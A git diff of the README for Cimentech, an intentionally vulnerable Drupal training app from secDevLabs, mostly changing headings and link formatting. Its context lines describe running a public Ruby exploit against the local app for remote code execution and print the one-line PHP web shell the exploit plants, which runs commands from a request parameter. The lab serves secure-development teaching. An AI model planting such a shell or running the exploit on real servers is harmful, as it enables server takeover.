@@ -19,11 +19,11 @@ Cimentech is a simple web application built with Drupal that contains an example
 
 Imagine that components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts.
 
-The main goal of this app is to discuss how **Using Components With Known Vulnerabilities** can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.
+The main goal of this app is to discuss how **Vulnerable and Outdated Components** can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.
 
 ## Setup
 
-To start this intentionally **insecure application**, you will need [Docker][Docker Install] and [Docker Compose][Docker Compose Install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
+To start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:
 
 ```sh
 cd secDevLabs/owasp-top10-2017-apps/a9/cimentech
@@ -33,7 +33,7 @@ cd secDevLabs/owasp-top10-2017-apps/a9/cimentech
 make install
 ```
 
-Then simply visit [localhost][App] ! 😆
+Then simply visit [localhost][app] ! 😆
 
 ## Get to know the app 🏗
 
@@ -48,7 +48,6 @@ Now that you know the purpose of this app, what could go wrong? The following se
 ### 👀
 
 #### Use of a vulnerable Drupal version allows for remote code execution
-
 
 It's possible to reach the server's web application from the standard HTTP port 80, as shown by the image below:
 
@@ -100,7 +99,7 @@ ruby /tmp/44449.rb http://localhost
 
 **NOTE 2**: If you came across an execution error when trying to run the exploit, please have a look at this [Issue][4] for information on how to proceed.
 
-The exploit works by adding into the server a malicious `s.php`, which allows remote code execution on it via following malicious content: 
+The exploit works by adding into the server a malicious `s.php`, which allows remote code execution on it via following malicious content:
 
 ```php
 <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
@@ -114,7 +113,7 @@ Using the exploit's "fake shell", we can type a command, such as `whoami`, to ve
 
 How would you mitigate this vulnerability? After your changes, an attacker should not be able to:
 
-* Execute code remotely through the exploit above
+- Execute code remotely through the exploit above
 
 ## PR solutions
 
@@ -124,10 +123,10 @@ How would you mitigate this vulnerability? After your changes, an attacker shoul
 
 We encourage you to contribute to SecDevLabs! Please check out the [Contributing to SecDevLabs](../../../docs/CONTRIBUTING.md) section for guidelines on how to proceed! 🎉
 
-[Docker Install]:  https://docs.docker.com/install/
-[Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost:80
-[secDevLabs]: https://github.com/globocom/secDevLabs
+[docker install]: https://docs.docker.com/install/
+[docker compose install]: https://docs.docker.com/compose/install/
+[app]: http://localhost:80
+[secdevlabs]: https://github.com/globocom/secDevLabs
 [1]: https://www.ruby-lang.org/en/documentation/installation/
 [2]: https://github.com/globocom/secDevLabs/tree/master/owasp-top10-2017-apps/a9/Cimentech
 [3]: https://www.exploit-db.com/
